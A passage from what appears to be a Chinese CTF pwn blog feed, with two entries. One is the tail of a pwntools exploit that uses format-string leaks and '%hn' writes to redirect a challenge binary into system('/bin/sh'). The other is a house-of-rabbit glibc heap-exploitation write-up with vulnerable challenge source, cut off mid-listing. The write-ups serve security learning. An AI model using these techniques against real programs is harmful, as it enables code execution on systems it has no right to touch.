punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">createcontact</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> phone<span class=\"token punctuation\">,</span> descrip_len<span class=\"token punctuation\">,</span> description<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'>>> '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    sl<span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'Contact info: \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'Name: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    sl<span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'You have 10 numbers\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    sl<span class=\"token punctuation\">(</span>phone<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'Length of description: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    sl<span class=\"token punctuation\">(</span>descrip_len<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'description:\\n\\t\\t'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    sl<span class=\"token punctuation\">(</span>description<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">printcontact</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'>>> '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    sl<span class=\"token punctuation\">(</span><span class=\"token string\">'4'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'Contacts:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'Description: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">'%2$paaaa'</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>createcontact<span class=\"token punctuation\">(</span><span class=\"token string\">'%p'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1111'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>printcontact<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'Descriptio0x'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>libcbase <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">11</span> <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'libcbase'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>system <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> libcbase</pre></td></tr><tr><td data-num=\"79\"></td><td><pre>binsh <span class=\"token operator\">=</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> libcbase</pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>pl <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    p32<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    <span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    p32<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    <span class=\"token string\">b'&lt;>%10$p()%6$pcccc'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>createcontact<span class=\"token punctuation\">(</span><span class=\"token string\">'huan'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1111'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>printcontact<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;>0x'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>heapaddr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'()0x'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>stack <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>ret_sys <span class=\"token operator\">=</span> heapaddr <span class=\"token operator\">+</span> <span class=\"token number\">12</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'heapaddr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'stack'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'ret_sys'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre><span class=\"token comment\"># debug('b *0x08048BD1')</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre><span class=\"token comment\"># pl1 = ret_sys &amp; 0xff</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre><span class=\"token comment\"># lg('pl1')</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>pl1 <span class=\"token operator\">=</span> ret_sys <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'pl1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>pl2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>ret_sys <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'pl2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre></pre></td></tr><tr><td data-num=\"111\"></td><td><pre></pre></td></tr><tr><td data-num=\"112\"></td><td><pre><span class=\"token comment\"># pl = '%' + str(ret_sys &amp; 0xffff) + 'c%6$n'</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre><span class=\"token comment\"># createcontact('huan','1111',str(0x32),pl)</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre><span class=\"token comment\"># printcontact()</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">'%'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>pl1<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'c%6$hn'</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>createcontact<span class=\"token punctuation\">(</span><span class=\"token string\">'huan'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1111'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>printcontact<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">'%'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'c%34$hn'</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>createcontact<span class=\"token punctuation\">(</span><span class=\"token string\">'huan'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1111'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>printcontact<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">'%'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>pl2<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'c%71$hn'</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>createcontact<span class=\"token punctuation\">(</span><span class=\"token string\">'huan'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1111'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>printcontact<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'>>> '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">'5'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre></pre></td></tr><tr><td data-num=\"131\"></td><td><pre></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "堆——格式化字符串",
                "栈迁移"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/07/26/house-of-rabbit/",
            "url": "https://yhuanhuan01.github.io/2024/07/26/house-of-rabbit/",
            "title": "house-of-rabbit",
            "date_published": "2024-07-26T02:03:08.000Z",
            "content_html": "<h1 id=\"house-of-rabbit\"><a class=\"markdownIt-Anchor\" href=\"#house-of-rabbit\">#</a> house-of-rabbit</h1>\n<p>漏洞成因</p>\n<blockquote>\n<p>堆溢出写、 <code>use after free</code> 、 <code>edit after free</code></p>\n</blockquote>\n<p>适用范围</p>\n<blockquote>\n<ul>\n<li><code>2.23</code> —— <code>2.31</code></li>\n<li>超过  <code>0x400</code>  大小的堆分配</li>\n<li>可以写  <code>fastbin</code>  的  <code>fd</code>  或者  <code>size</code>  域</li>\n</ul>\n</blockquote>\n<h3 id=\"概要\"><a class=\"markdownIt-Anchor\" href=\"#概要\">#</a> 概要：</h3>\n<p>通过将 chunk 置入 fastbin 内，修改其 fd 指向 fake chunk，然后分配或释放大块，触发 <code>malloc_consolidate</code> ，此时 fake chunk 被放置到 unsortedbin 或对应的 smallbins 或 largebins 内</p>\n<h3 id=\"绕过检测\"><a class=\"markdownIt-Anchor\" href=\"#绕过检测\">#</a> 绕过检测：</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">FASTBIN_CONSOLIDATION_THRESHOLD</span>  <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token number\">65536UL</span><span class=\"token punctuation\">)</span></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> FASTBIN_CONSOLIDATION_THRESHOLD<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">have_fastchunks</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token function\">malloc_consolidate</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li><code>2.26</code>  加入了  <code>unlink</code>  对  <code>presize</code>  的检查</li>\n<li><code>2.27</code>  加入了  <code>fastbin</code>  的检查</li>\n</ul>\n<h3 id=\"利用思路\"><a class=\"markdownIt-Anchor\" href=\"#利用思路\">#</a> 利用思路：</h3>\n<blockquote>\n<p>该利用技巧的核心是  <code>malloc_consolidate</code>  函数，当检测到有  <code>fastbin</code>  的时候，会取出每一个  <code>fastbin chunk</code> ，将其放置到  <code>unsortedbin</code>  中，并进行合并。</p>\n</blockquote>\n<p>one:</p>\n<ul>\n<li>申请  <code>chunk A</code> 、 <code>chunk B</code> ，其中  <code>chunk A</code>  的大小位于  <code>fastbin</code>  范围</li>\n<li>释放  <code>chunk A</code> ，使其进入到  <code>fastbin</code></li>\n<li>利用  <code>use after free</code> ，修改  <code>A-&gt;fd</code>  指向地址  <code>X</code> ，需要伪造好  <code>fake chunk</code> ，使其不执行  <code>unlink</code>  或者绕过  <code>unlink</code></li>\n<li>分配足够大的  <code>chunk</code> ，或者释放  <code>0x10000</code>  以上的  <code>chunk</code> ，只要能触发  <code>malloc_consolidate</code>  即可</li>\n<li>此时  <code>fake chunk</code>  被放到了  <code>unsortedbin</code> ，或者进入到对应的  <code>smallbin/largebin</code></li>\n<li>取出  <code>fake chunk</code>  进行读写即可</li>\n</ul>\n<p>two:</p>\n<ul>\n<li>申请两个 fastbin 大小的 chunk，A，B，C。C 隔断 top_chunk</li>\n<li>freeA，B</li>\n<li>修改 A 的 fastbin chunk 的 <code>大小</code> ，使其包裹 B</li>\n<li>触发 <code>malloc_consolidate</code></li>\n</ul>\n<h3 id=\"例题\"><a class=\"markdownIt-Anchor\" href=\"#例题\">#</a> 例题：</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1lodWFuaHVhbjAxL0NURl9Qd25fR2FtZS90cmVlL21haW4vaG91c2Utb2YtcmFiYml0\">https://github.com/Yhuanhuan01/CTF_Pwn_Game/tree/main/house-of-rabbit</span></p>\n<p><img data-src=\"/img/house-of-rabbit/image-20240726081440063.png\" alt=\"image-20240726081440063\"></p>\n<blockquote>\n<p>题目源码我稍微修改一下，所以直接放源码吧。</p>\n</blockquote>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>v3 <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Add>>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%lu\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            v3 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            v3 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            v3 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xA00000LL</span><span class=\"token punctuation\">)</span><span class=\"token 